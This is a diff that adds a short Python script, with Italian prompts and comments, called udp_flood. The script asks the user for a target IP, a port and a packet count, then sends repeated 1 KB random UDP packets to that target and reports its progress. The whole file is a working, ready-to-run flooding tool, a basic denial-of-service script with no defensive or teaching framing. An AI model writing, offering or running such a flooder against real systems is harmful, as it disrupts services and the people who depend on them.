@@ -1,0 +1,56 @@
+import socket
+import random
+
+
+def udp_flood():
+    try:
+        # Input IP target
+        target_ip = input("Inserisci IP target: ").strip()
+        if not target_ip:
+            raise ValueError("IP target non valido")
+
+        # Input porta con validazione
+        target_port = int(input("Inserisci porta UDP target (0-65535): "))
+        if target_port < 0 or target_port > 65535:
+            raise ValueError("La porta deve essere compresa tra 0 e 65535")
+
+        # Input numero pacchetti
+        num_packets = int(input("Numero di pacchetti da inviare: "))
+        if num_packets <= 0:
+            raise ValueError("Il numero di pacchetti deve essere maggiore di zero")
+
+        # Creazione socket UDP
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+        # Payload da 1 KB
+        payload = random.randbytes(1024)
+
+        print(f"\nInvio di {num_packets} pacchetti UDP verso {target_ip}:{target_port}\n")
+
+        for i in range(1, num_packets + 1):
+            sock.sendto(payload, (target_ip, target_port))
+
+            # Output informativo limitato
+            if i % 10 == 0 or i == num_packets:
+                print(f"Pacchetti inviati: {i}/{num_packets}")
+
+        print("\nInvio completato correttamente.")
+
+    except ValueError as ve:
+        print(f"Errore di input: {ve}")
+
+    except socket.gaierror:
+        print("Errore di rete: impossibile risolvere l'indirizzo IP")
+
+    except OSError as oe:
+        print(f"Errore di rete: {oe}")
+
+    finally:
+        try:
+            sock.close()
+        except Exception:
+            pass
+
+
+if __name__ == "__main__":
+    udp_flood()
